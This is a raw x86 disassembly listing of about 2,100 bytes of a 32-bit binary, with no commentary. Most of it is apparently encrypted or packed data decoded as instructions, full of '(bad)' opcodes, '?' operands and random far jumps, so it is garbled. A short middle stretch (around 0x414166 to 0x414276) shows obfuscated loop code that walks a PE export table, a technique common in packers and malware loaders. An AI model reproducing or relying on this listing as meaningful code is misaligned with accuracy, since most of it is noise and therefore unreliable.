  413ff1:	sti    
  413ff2:	imul   edi,DWORD PTR [esi-0x36],0x1f
  413ff6:	ficomp WORD PTR [edx+ebp*8+0xb]
  413ffa:	loope  0x413fcd
  413ffc:	push   cs
  413ffd:	pushf  
  413ffe:	adc    eax,0xa65d213b
  414003:	test   BYTE PTR [eax],bl
  414005:	xor    bl,BYTE PTR [esi-0xf]
  414008:	fdiv   st(5),st
  41400a:	or     al,0x5e
  41400c:	inc    eax
  41400d:	out    dx,eax
  41400e:	int3   
  41400f:	mov    ebp,DWORD PTR [edi]
  414011:	jo     0x414006
  414013:	aaa    
  414014:	xchg   BYTE PTR [edi],bl
  414016:	js     0x41404c
  414018:	inc    ebx
  414019:	push   edx
  41401a:	stos   DWORD PTR es:[edi],eax
  41401b:	jo     0x414015
  41401d:	shl    esi,0xe
  414020:	out    dx,al
  414021:	and    al,ch
  414023:	pop    esi
  414024:	xchg   edx,eax
  414025:	jb     0x414085
  414027:	jb     0x414059
  414029:	loope  0x414049
  41402b:	push   ds
  41402c:	int    0xd6
  41402e:	jge    0x414089
  414030:	mov    ds:0x123199bf,eax
  414035:	cmp    BYTE PTR [ebp-0x1b4d1b5e],dl
  41403b:	sub    al,0x53
  41403d:	jecxz  0x41408e
  41403f:	lock ret 
  414041:	js     0x4140a4
  414043:	call   0x566:0x8e5e0f51
  41404a:	int    0x7
  41404c:	ret    0x9e19
  41404f:	ins    DWORD PTR es:[edi],dx
  414050:	mov    edi,DWORD PTR [ecx]
  414052:	xchg   ecx,eax
  414053:	mov    esp,0x7181ef25
  414058:	mov    ds:0xadfb4472,eax
  41405d:	scas   al,BYTE PTR es:[edi]
  41405e:	enter  0x233b,0xc9
  414062:	dec    edi
  414063:	mov    dh,0x6d
  414065:	sar    BYTE PTR [esi+0x18],1
  414068:	je     0x414094
  41406a:	push   esi
  41406b:	xchg   esi,eax
  41406c:	data16 (bad) 
  41406e:	cli    
  41406f:	fwait
  414070:	and    dh,BYTE PTR [ebx]
  414072:	mov    ah,0x3f
  414074:	(bad)  
  414075:	and    DWORD PTR [edi-0x2ed7ddb0],ebp
  41407b:	(bad)  
  41407c:	jecxz  0x41405f
  41407e:	imul   ebp,DWORD PTR [esp+ebx*4],0x3b
  414082:	jg     0x4140d3
  414084:	jge    0x4140bb
  414086:	inc    ecx
  414087:	mov    ds:0x5fb6774d,eax
  41408c:	pop    ss
  41408d:	bound  eax,QWORD PTR [ecx-0x554feac6]
  414093:	add    DWORD PTR [edi+0x7d4f2e3e],esi
  414099:	push   edx
  41409a:	xchg   ecx,eax
  41409b:	xor    BYTE PTR [eax],0x0
  41409e:	lock (bad) 
  4140a0:	fadd   DWORD PTR [ecx+ecx*1]
  4140a3:	std    
  4140a4:	(bad)  
  4140a6:	inc    edx
  4140a7:	repnz sbb al,0x6a
  4140aa:	dec    ebx
  4140ab:	cld    
  4140ac:	mov    esi,0x87ba878a
  4140b1:	in     al,dx
  4140b2:	push   es
  4140b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140b4:	data16 aas 
  4140b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140b7:	push   eax
  4140b8:	add    esp,DWORD PTR [edx-0x75]
  4140bb:	out    0xfa,al
  4140bd:	add    al,0xfb
  4140bf:	das    
  4140c0:	push   ss
  4140c1:	inc    edi
  4140c2:	iret   
  4140c3:	push   edi
  4140c4:	je     0x414140
  4140c6:	or     al,0x3f
  4140c8:	sub    bh,al
  4140ca:	jmp    0x2a3f:0xf8ea8c61
  4140d1:	xchg   DWORD PTR [eax],esp
  4140d3:	cli    
  4140d4:	idiv   ah
  4140d6:	or     eax,0xbe3cec02
  4140db:	out    0x71,eax
  4140dd:	xor    al,0xa
  4140df:	xchg   DWORD PTR [edx],edi
  4140e1:	sbb    DWORD PTR [ebp+0x5a],ecx
  4140e4:	xor    bh,ch
  4140e6:	push   ss
  4140e7:	fimul  WORD PTR [eax+0x129395e2]
  4140ed:	inc    ebx
  4140ee:	fidivr DWORD PTR [ecx]
  4140f0:	nop
  4140f1:	dec    ebx
  4140f2:	popa   
  4140f3:	sbb    eax,0x342d2014
  4140f8:	pushf  
  4140f9:	scas   al,BYTE PTR es:[edi]
  4140fa:	jecxz  0x414166
  4140fc:	out    dx,eax
  4140fd:	std    
  4140fe:	xor    DWORD PTR [edi+0x7bbf3731],ebx
  414104:	mov    cl,0x2a
  414106:	and    cl,BYTE PTR [ebx]
  414108:	fsubr  DWORD PTR [ebx-0x4f]
  41410b:	dec    edi
  41410c:	popf   
  41410d:	mov    ds:0x4e6c9cbd,eax
  414112:	inc    ebp
  414113:	mov    ds:0xd9a97b5d,eax
  414118:	fst    QWORD PTR [ebx-0x40]
  41411b:	lods   eax,DWORD PTR ds:[esi]
  41411c:	clc    
  41411d:	pop    ss
  41411e:	jecxz  0x4140dd
  414120:	icebp  
  414121:	enter  0x25a1,0x49
  414125:	int    0xa5
  414127:	shl    DWORD PTR [edi+0x3],cl
  41412a:	int3   
  41412b:	dec    esi
  41412c:	(bad)
  41412f:	call   0x1bbe0352
  414134:	jg     0x4140f1
  414136:	rcr    edx,cl
  414138:	frstor [ebx-0x4654b264]
  41413e:	mov    esp,0x41b778a5
  414143:	and    al,BYTE PTR [ebx+edx*1-0x28]
  414147:	daa    
  414148:	lahf   
  414149:	clc    
  41414a:	jae    0x4141b4
  41414c:	xchg   edi,eax
  41414d:	repz int 0x29
  414150:	xchg   ebx,eax
  414151:	stos   DWORD PTR es:[edi],eax
  414152:	mov    cl,0x42
  414154:	out    dx,eax
  414155:	sbb    DWORD PTR ss:[eax-0x68b9006c],edx
  41415c:	sahf   
  41415d:	mov    WORD PTR [ebx+0x2581ec45],cs
  414163:	aad    0xfc
  414165:	inc    edx
  414166:	add    BYTE PTR [eax],al
  414168:	add    BYTE PTR [eax],al
  41416a:	add    BYTE PTR [ebx+0x42fcd50d],cl
  414170:	add    BYTE PTR [ecx-0x77],al
  414173:	or     eax,0x42fcd5
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142fc
  414283:	mov    DWORD PTR [edi+0x707380fe],ecx
  414289:	jo     0x414244
  41428b:	jle    0x4142fd
  41428d:	jo     0x4142ea
  41428f:	dec    edx
  414290:	mov    esi,0x7b8fd3be
  414295:	xor    cl,BYTE PTR [esi-0x4c]
  414298:	cdq    
  414299:	push   edx
  41429a:	push   esp
  41429b:	and    eax,0x50
  41429e:	cmp    DWORD PTR [ecx+0x17],edx
  4142a1:	daa    
  4142a2:	int    0xa3
  4142a4:	push   ss
  4142a5:	sub    al,0xf7
  4142a7:	mov    esp,0xb0a2339d
  4142ac:	push   es
  4142ad:	mov    ch,0xe
  4142af:	or     ch,dh
  4142b1:	nop
  4142b2:	dec    ebp
  4142b3:	jo     0x4142cf
  4142b5:	bswap  ebx
  4142b7:	mov    ebx,0xce7bb6c2
  4142bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142bd:	aas    
  4142be:	cmp    DWORD PTR [esi+0x1e],ebx
  4142c1:	xchg   edi,eax
  4142c2:	sbb    eax,0x73cac7e3
  4142c7:	stc    
  4142c8:	mov    ch,0xe0
  4142ca:	add    eax,0xc8f85ba3
  4142cf:	sbb    BYTE PTR [ebx],bh
  4142d1:	mov    ecx,0xe845ef3c
  4142d6:	add    DWORD PTR [eax+0x4334ba39],ecx
  4142dc:	xchg   ecx,eax
  4142dd:	jb     0x4142d3
  4142df:	dec    ebx
  4142e0:	cmp    eax,0xdd8cf3b4
  4142e5:	jnp    0x4142ab
  4142e7:	sbb    edx,DWORD PTR [edx-0x14c1b5ec]
  4142ed:	in     al,dx
  4142ee:	sub    edi,ebx
  4142f0:	retf   0xa10a
  4142f3:	xor    al,0x3f
  4142f5:	push   ebp
  4142f6:	adc    BYTE PTR [ecx-0x47c76078],dh
  4142fc:	popa   
  4142fd:	xor    BYTE PTR [ecx+ecx*4-0x4f],bh
  414301:	add    al,BYTE PTR [eax+0x10]
  414304:	xchg   esp,eax
  414305:	sub    al,BYTE PTR [edi+0x675175f3]
  41430b:	push   0xffffff94
  41430d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41430e:	dec    eax
  41430f:	retf   0x3248
  414312:	not    DWORD PTR [eax-0x26]
  414315:	popa   
  414316:	inc    eax
  414317:	mov    ch,0xee
  414319:	sbb    dl,dl
  41431b:	clc    
  41431c:	xchg   ebx,eax
  41431d:	fisub  WORD PTR [esp+esi*8-0x6]
  414321:	inc    ecx
  414322:	int    0x5e
  414324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414325:	pop    esp
  414326:	stos   DWORD PTR es:[edi],eax
  414327:	jp     0x414387
  414329:	jno    0x4142e6
  41432b:	jle    0x414394
  41432d:	test   BYTE PTR [ebp+0x5997a5fe],dl
  414333:	xor    DWORD PTR [edx-0x66],ebp
  414336:	inc    ecx
  414337:	push   0x8e70a5c2
  41433c:	sub    ah,BYTE PTR [eax+0x349fc446]
  414342:	arpl   di,bx
  414344:	ss xchg esi,eax
  414346:	dec    BYTE PTR [bx+si-0x3b4c]
  41434b:	(bad)  
  41434c:	push   ebp
  41434d:	dec    ecx
  41434e:	(bad)  
  41434f:	sbb    esp,ebx
  414351:	ja     0x41430c
  414353:	jbe    0x414352
  414355:	aad    0x9
  414357:	dec    eax
  414358:	adc    BYTE PTR [edx-0x65],ch
  41435b:	std    
  41435c:	mov    cl,0x75
  41435e:	fcmove st,st(6)
  414360:	ficom  DWORD PTR [esi+0x1c]
  414363:	pop    ebp
  414364:	cmp    eax,0x3d67c10f
  414369:	lds    edx,FWORD PTR [esi]
  41436b:	mov    es,WORD PTR [edx]
  41436d:	sahf   
  41436e:	pushf  
  41436f:	xchg   ecx,eax
  414370:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  414372:	mov    ds:0x8b0d00a3,al
  414377:	mov    edi,0x9591b8c6
  41437c:	jo     0x4143e8
  41437e:	sbb    ebp,ebx
  414380:	mov    BYTE PTR ds:0x772ce8fa,0x21
  414387:	sbb    ebp,ebx
  414389:	inc    eax
  41438a:	xchg   ebp,eax
  41438b:	repz mov ebp,0xdf886e12
  414391:	rol    DWORD PTR [edi],cl
  414393:	cmp    al,0x0
  414395:	sti    
  414396:	les    ecx,FWORD PTR ds:0x40e6b8a6
  41439c:	stos   BYTE PTR es:[edi],al
  41439d:	mov    esp,0xf3a2cff4
  4143a2:	aaa    
  4143a3:	and    BYTE PTR [ebx],0x41
  4143a6:	add    eax,0xdce13e8b
  4143ab:	sub    dh,al
  4143ad:	and    BYTE PTR [ecx],dl
  4143af:	push   cs
  4143b0:	cmp    BYTE PTR gs:[eax+ebx*1],ah
  4143b4:	repnz push ebx
  4143b6:	shl    BYTE PTR [edi+0x4ccf33b2],0x21
  4143bd:	mov    al,0xb3
  4143bf:	ss addr16 mov edx,0x9ed07771
  4143c6:	sub    DWORD PTR [ebp+0x5],eax
  4143c9:	lds    eax,FWORD PTR [edi+0x6ebcb220]
  4143cf:	loop   0x414359
  4143d1:	lock cmp ebp,ecx
  4143d4:	mov    ah,0x60
  4143d6:	xchg   ebp,eax
  4143d7:	xchg   edi,eax
  4143d8:	lahf   
  4143d9:	jb     0x414421
  4143db:	jbe    0x41444e
  4143dd:	pop    ebx
  4143de:	dec    ebx
  4143df:	sbb    BYTE PTR [ecx-0x6b934867],bl
  4143e5:	(bad)  
  4143e6:	cld    
  4143e7:	sbb    al,0xbf
  4143e9:	jb     0x4143d1
  4143eb:	dec    edi
  4143ec:	sbb    BYTE PTR [esi-0x36c4f3d],al
  4143f2:	(bad)  
  4143f3:	sbb    ebp,DWORD PTR ds:0x8f1a891d
  4143f9:	mov    ds:0x12794289,eax
  4143fe:	or     DWORD PTR es:[edx-0x7382c7f5],esp
  414405:	pop    eax
  414406:	test   BYTE PTR [eax],ch
  414408:	push   ss
  414409:	pop    eax
  41440a:	mov    WORD PTR [edi+0x353a8227],fs
  414410:	das    
  414411:	test   al,0x8f
  414413:	(bad)  
  414416:	shl    bh,0x21
  414419:	enter  0x555b,0x19
  41441d:	(bad)  
  41441e:	retf   
  41441f:	es jno 0x414430
  414422:	cmp    eax,0x29eaf6a3
  414427:	retf   0xc99a
  41442a:	add    BYTE PTR [eax-0x16c8d8d9],dh
  414430:	je     0x414474
  414432:	outs   dx,BYTE PTR ds:[esi]
  414433:	sbb    DWORD PTR [ecx],edx
  414435:	(bad)  
  414436:	pushf  
  414437:	fs mov ebx,0x4eedab4b
  41443d:	test   dh,cl
  41443f:	std    
  414440:	repz mov cl,0x3e
  414443:	push   esi
  414444:	xchg   esp,eax
  414445:	je     0x41445d
  414447:	push   0xffffff88
  414449:	xor    DWORD PTR [ebp+0xb],edi
  41444c:	fisubr WORD PTR [ebx]
  41444e:	cmc    
  41444f:	xor    BYTE PTR [ecx-0x62],al
  414452:	push   ebx
  414453:	daa    
  414454:	xchg   edi,eax
  414455:	push   cs
  414456:	sub    bh,BYTE PTR [edi]
  414458:	pop    ebp
  414459:	sti    
  41445a:	je     0x414481
  41445c:	push   ss
  41445d:	xor    al,BYTE PTR [edx+0x17fd3626]
  414463:	inc    esi
  414464:	(bad)  
  414465:	fldcw  WORD PTR [edx]
  414467:	into   
  414468:	mov    dl,0x7e
  41446a:	xor    eax,0xfb950863
  41446f:	int3   
  414470:	in     al,dx
  414471:	add    al,0x5a
  414473:	add    BYTE PTR ds:0xa194bf55,ch
  414479:	test   BYTE PTR [esi],0x8d
  41447c:	xchg   ebp,eax
  41447d:	daa    
  41447e:	mov    dh,BYTE PTR [ecx+0x2c]
  414481:	(bad)  
  414482:	and    esi,DWORD PTR [esi+ecx*4]
  414485:	lods   al,BYTE PTR ds:[esi]
  414486:	cmp    eax,0xa6e43471
  41448b:	mov    eax,0x46dcd298
  414490:	gs pop edx
  414492:	inc    esp
  414493:	out    dx,eax
  414494:	cdq    
  414495:	das    
  414496:	or     al,BYTE PTR [ebx-0x7f]
  414499:	push   esp
  41449a:	ret    
  41449b:	add    BYTE PTR [ecx+eiz*4+0x1b],ah
  41449f:	lock in al,0xff
  4144a2:	test   al,0xc7
  4144a4:	sub    eax,0x5f95e8f7
  4144a9:	xor    esi,ebx
  4144ab:	sar    DWORD PTR [ebp+0x71a55c5e],cl
  4144b1:	pop    esi
  4144b2:	ja     0x4144cb
  4144b4:	jmp    0x654b:0xb409366c
  4144bb:	pushf  
  4144bc:	or     BYTE PTR [esi],al
  4144be:	xlat   BYTE PTR ds:[ebx]
  4144bf:	das    
  4144c0:	les    ecx,FWORD PTR [ecx]
  4144c2:	xor    eax,0xb0b67c32
  4144c7:	in     eax,dx
  4144c8:	or     esp,edx
  4144ca:	push   0xa54eea57
  4144cf:	sti    
  4144d0:	sub    BYTE PTR [ecx],bl
  4144d2:	(bad)  
  4144d3:	cli    
  4144d4:	jg     0x414528
  4144d6:	lahf   
  4144d7:	in     al,dx
  4144d8:	add    cl,BYTE PTR [ebx-0x6a]
  4144db:	js     0x4144bd
  4144dd:	sar    BYTE PTR [edi+eax*8],1
  4144e0:	fnstsw WORD PTR [ecx]
  4144e2:	and    bl,BYTE PTR [eax-0x74c88e6a]
  4144e8:	jmp    0x5e866618
  4144ed:	leave  
  4144ee:	xchg   bh,ah
  4144f0:	push   es
  4144f1:	xor    ecx,ecx
  4144f3:	push   es
  4144f4:	icebp  
  4144f5:	jmp    0x75e5:0x18cb54f6
  4144fc:	push   ebp
  4144fd:	cmp    eax,0x65a20a6
  414502:	fisttp WORD PTR [eax-0x51e885ae]
  414508:	mov    eax,0x737ee6b0
  41450d:	aas    
  41450e:	or     bl,al
  414510:	push   ds
  414511:	jo     0x4144b7
  414513:	add    al,0xb9
  414515:	add    ecx,DWORD PTR [eax-0x57278f2e]
  41451b:	mov    ecx,0x452fce5f
  414520:	mov    al,0xea
  414522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414523:	mov    esi,0xfaaa09e5
  414528:	imul   ebx,edx,0xffffffca
  41452b:	repnz push eax
  41452d:	aam    0xa3
  41452f:	ss jns 0x4145ad
  414532:	dec    eax
  414533:	shl    BYTE PTR [esi+edx*2+0x3f],1
  414537:	xor    cl,BYTE PTR [ecx+ebp*8-0x2d]
  41453b:	lea    ebp,[ebx]
  41453d:	adc    eax,0x6d41219c
  414542:	je     0x4144c4
  414544:	xchg   edi,eax
  414545:	imul   esi,DWORD PTR [esi],0xffffffda
  414548:	jae    0x414577
  41454a:	shr    cl,1
  41454c:	popf   
  41454d:	fstp   TBYTE PTR [edi-0x1]
  414551:	and    ah,BYTE PTR [ebx+0x9]
  414554:	sti    
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xb366beb4
  414576:	scas   al,BYTE PTR es:[edi]
  414577:	int3   
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414552
  414581:	lea    ebp,[esp+edi*4-0x2b]
  414585:	push   edi
  414586:	mov    eax,0x8e1c7a6e
  41458b:	lock aas 
  41458d:	and    DWORD PTR [ebx],ebx
  41458f:	fsubrp st(3),st
  414591:	or     al,0x1d
  414593:	cmp    esi,edx
  414595:	ss add al,0xf7
  414598:	hlt    
  414599:	pop    es
  41459a:	dec    ebx
  41459b:	(bad)  
  41459c:	repnz fidivr WORD PTR [ebp+0x45aeb1b2]
  4145a3:	(bad)  
  4145a5:	pop    edx
  4145a6:	sbb    ebx,ebp
  4145a8:	or     al,0xed
  4145aa:	push   0x1b
  4145ac:	inc    ecx
  4145ad:	push   ds
  4145ae:	iret   
  4145af:	push   ebx
  4145b0:	xchg   esi,eax
  4145b1:	mov    eax,0x4fd0203d
  4145b6:	mov    al,ds:0x187e0dc9
  4145bb:	pop    ebx
  4145bc:	sbb    eax,0xc1adad7d
  4145c1:	fld    QWORD PTR [edi+0x6e]
  4145c4:	sbb    ch,0x68
  4145c7:	sahf   
  4145c8:	and    dh,BYTE PTR [edi-0x7e249e0a]
  4145ce:	jb     0x4145f4
  4145d0:	mov    ah,0xdb
  4145d2:	dec    edx
  4145d3:	xchg   esp,eax
  4145d4:	stc    
  4145d5:	rcl    DWORD PTR [ebx+ebp*1-0x1b],cl
  4145d9:	cmp    eax,0x217ecec5
  4145de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145df:	out    dx,al
  4145e0:	dec    ebp
  4145e1:	mov    ebp,0x6ca8abe4
  4145e6:	pop    es
  4145e7:	sar    DWORD PTR [ebx+0x23],1
  4145ea:	repnz fistp DWORD PTR [edx]
  4145ed:	lods   al,BYTE PTR ds:[esi]
  4145ee:	fcom   DWORD PTR [ebx-0x38]
  4145f1:	or     ecx,eax
  4145f3:	jo     0x4145bb
  4145f5:	icebp  
  4145f6:	add    al,0x9a
  4145f8:	xchg   esp,eax
  4145f9:	jp     0x4145e3
  4145fb:	xchg   esp,eax
  4145fc:	imul   ecx,DWORD PTR [esi-0x72224d9d],0x70d0341d
  414606:	sub    al,0x8c
  414608:	jo     0x41461d
  41460a:	pop    edi
  41460b:	inc    eax
  41460c:	lea    ebp,ds:0xfa5176f6
  414612:	and    esi,DWORD PTR [eax-0x41]
  414615:	mov    cl,0x8c
  414617:	jmp    0x2bb6:0x9dc3b640
  41461e:	lds    esp,FWORD PTR [edi+ecx*4-0x2cafc3bc]
  414625:	and    DWORD PTR [ebx],eax
  414627:	push   ebx
  414628:	lahf   
  414629:	add    al,BYTE PTR [ecx]
  41462b:	push   ss
  41462c:	adc    BYTE PTR [eax-0x4d],0xbb
  414630:	add    eax,0x3ee1575
  414635:	enter  0x742b,0x61
  414639:	xchg   esp,eax
  41463a:	mov    ecx,DWORD PTR [edx-0x5dca042f]
  414640:	mov    ?,WORD PTR [ecx-0x42]
  414643:	sub    ebp,DWORD PTR [edi-0x61f48ff0]
  414649:	inc    edi
  41464a:	mov    ebx,edx
  41464c:	lea    edx,[edx+0x6f]
  41464f:	jb     0x4146c5
  414651:	mov    eax,ds:0x2edb815c
  414656:	mov    esi,0x38e6d0ba
  41465b:	(bad)  
  41465c:	pop    ebx
  41465d:	xchg   ecx,eax
  41465e:	rol    DWORD PTR [ebp+eax*8+0x42a80447],cl
  414665:	mov    ds:0xe10640aa,eax
  41466a:	cwde   
  41466b:	fst    DWORD PTR ds:0xcf856abb
  414671:	test   cl,bl
  414673:	mov    WORD PTR [ecx-0x3a],?
  414676:	push   esi
  414677:	int    0x2e
  414679:	leave  
  41467a:	and    dh,BYTE PTR [edx+ebx*1]
  41467d:	stos   BYTE PTR es:[edi],al
  41467e:	fild   WORD PTR [ebp-0x5390990]
  414684:	inc    eax
  414685:	cmp    eax,DWORD PTR [edi-0x74]
  414688:	jp     0x414619
  41468a:	pop    ebx
  41468b:	jb     0x414652
  41468d:	popf   
  41468e:	sbb    WORD PTR [eax+edx*4-0x504be117],cx
  414696:	loopne 0x4146f8
  414698:	or     esi,DWORD PTR ds:0xececbefd
  41469e:	iret   
  41469f:	das    
  4146a0:	dec    esi
  4146a1:	jecxz  0x414704
  4146a3:	out    dx,eax
  4146a4:	(bad)  
  4146a5:	mov    esi,0x3031cfee
  4146aa:	test   BYTE PTR [edx-0x9],dh
  4146ad:	jbe    0x4146e4
  4146af:	lea    ebp,[edx-0x7d4eebcc]
  4146b5:	pop    ebp
  4146b6:	xchg   edi,eax
  4146b7:	xchg   dh,ah
  4146b9:	cmp    DWORD PTR [eax-0x11fca661],edi
  4146bf:	pop    esi
  4146c0:	(bad)  
  4146c1:	mov    ds:0x99054ad4,al
  4146c6:	mov    dh,0xa
  4146c8:	sar    BYTE PTR [edx-0x5a],0x5d
  4146cc:	jge    0x4146c2
  4146ce:	fidiv  DWORD PTR [ebx+ebx*2+0x60]
  4146d2:	mov    esi,0x777a6a00
  4146d7:	js     0x414676
  4146d9:	mov    al,ds:0x5b437840
  4146de:	or     DWORD PTR [esi-0x2f0667e0],0xe7d337fe
  4146e8:	push   cs
  4146e9:	js     0x414763
  4146eb:	retf   
  4146ec:	repz scas eax,DWORD PTR es:[edi]
  4146ee:	mov    bl,0xb
  4146f0:	add    DWORD PTR [ebp-0xa6fb322],esi
  4146f6:	popa   
  4146f7:	add    al,0xa6
  4146f9:	add    BYTE PTR [ecx-0x22],cl
  4146fc:	dec    edx
  4146fd:	pop    es
  4146fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146ff:	retf   
  414700:	lahf   
  414701:	push   cs
  414702:	test   BYTE PTR [edi-0x1a91cf1d],bh
  414708:	or     eax,0xe14268c6
  41470d:	mov    al,ds:0xa3e42c37
  414712:	cmp    esi,DWORD PTR [edx+0x6fd5392c]
  414718:	pop    esi
  414719:	add    ebp,DWORD PTR [esi+0x15cb5149]
  41471f:	sub    al,0xba
  414721:	shl    DWORD PTR [eax+0x30],0xcf
  414725:	mov    ah,0xf4
  414727:	mov    ebp,fs
  414729:	pop    ebp
  41472a:	ficom  WORD PTR cs:[eax-0x4c]
  41472e:	adc    al,0x3e
  414730:	xchg   BYTE PTR [ecx-0x444c0c91],dl
  414736:	icebp  
  414737:	icebp  
  414738:	imul   eax,DWORD PTR [ebx-0x1],0x6a
  41473c:	in     al,dx
  41473d:	and    BYTE PTR [esi+0x47],0xf8
  414741:	repnz into 
  414743:	cmp    eax,0xe508832f
  414748:	mov    edx,0x8b1a2504
  41474d:	jae    0x41473d
  41474f:	xor    eax,0xc8ecb8d6
  414754:	mul    BYTE PTR [eax+0x7c6e67fe]
  41475a:	and    al,0x94
  41475c:	rcl    BYTE PTR [esi+0x1aacbd0],cl
  414762:	ror    DWORD PTR [edi+0x7],cl
  414765:	das    
  414766:	dec    esi
  414767:	aas    
  414768:	push   edi
  414769:	push   edx
  41476a:	xor    al,0x17
  41476c:	jge    0x4147d4
  41476e:	int    0xc0
  414770:	lahf   
  414771:	jg     0x414719
  414773:	adc    ecx,ebp
  414775:	jae    0x41479c
  414777:	inc    ebx
  414778:	dec    esi
  414779:	xor    cl,dl
  41477b:	retf   
  41477c:	mov    dl,0x93
  41477e:	test   eax,0x9a670b95
  414783:	mov    ebp,0x582b6a
  414788:	sub    cl,al
  41478a:	or     DWORD PTR [ecx-0x68],0xd1b672f4
  414791:	xor    ch,BYTE PTR [edi-0x9d45f30]
  414797:	jbe    0x414794
  414799:	fnstenv [ebp+0x98ba5bb]
  41479f:	and    al,0x39
  4147a1:	cmp    BYTE PTR ds:0xeb703235,al
  4147a7:	push   0xa14647fe
  4147ac:	cld    
  4147ad:	(bad)  
  4147ae:	fsub   DWORD PTR [edi]
  4147b0:	adc    bh,dl
  4147b2:	push   ecx
  4147b3:	mov    DWORD PTR fs:[edx],edi
  4147b6:	xchg   bh,bl
  4147b8:	push   0x44e102a2
  4147bd:	mov    ds,WORD PTR [ebp-0x39e4feb2]
  4147c3:	inc    edi
  4147c4:	jl     0x4147ad
  4147c6:	xor    eax,0xeee292b2
  4147cb:	ror    DWORD PTR [ebp-0x45],cl
  4147ce:	js     0x4147e0
  4147d0:	imul   ebx,DWORD PTR [ebx+0x5b],0x254fb397
  4147d7:	aas    
  4147d8:	pop    ss
  4147d9:	jmp    FWORD PTR [eax+ecx*1]
  4147dc:	out    dx,al
  4147dd:	mov    cl,BYTE PTR [edx-0x5e]
  4147e0:	std    
  4147e1:	mov    ah,0xba
  4147e3:	cmp    BYTE PTR [ecx+0xffb4b6b],cl
  4147e9:	adc    eax,0x34f34234
  4147ee:	mov    al,ds:0x9a546275
  4147f3:	inc    ebx
  4147f4:	mov    bh,0x6f
  4147f6:	add    ebx,esi
  4147f8:	mov    ds:0xa9c62e3c,al
  4147fd:	rol    BYTE PTR [esi],cl
  4147ff:	jno    0x4147ea
  414801:	sub    eax,0x8e57a8e8
  414806:	shl    BYTE PTR [ebx],0x7f
  414809:	add    dh,bh
  41480b:	clc    
  41480c:	ficomp DWORD PTR [esp+esi*1]
  41480f:	dec    ecx
  414810:	jg     0x414806
  414812:	test   eax,0xd158aea2
  414817:	aaa    
  414818:	jp     0x414851
  41481a:	jbe    0x4147fa
  41481c:	fild   DWORD PTR [edx]
  41481e:	xor    ebx,ecx
  414820:	push   edi
  414821:	sbb    eax,0x7dcb5f92
  414826:	neg    DWORD PTR [esi+0x71edb294]
  41482c:	push   ds
  41482d:	dec    dl
  41482f:	inc    esp
  414830:	jne    0x4147db
  414832:	sub    eax,0x59318c31
  414837:	cli    
  414838:	adc    ah,dh
  41483a:	shr    DWORD PTR [bx+di+0x33],1
  41483e:	sbb    eax,0x599312d9
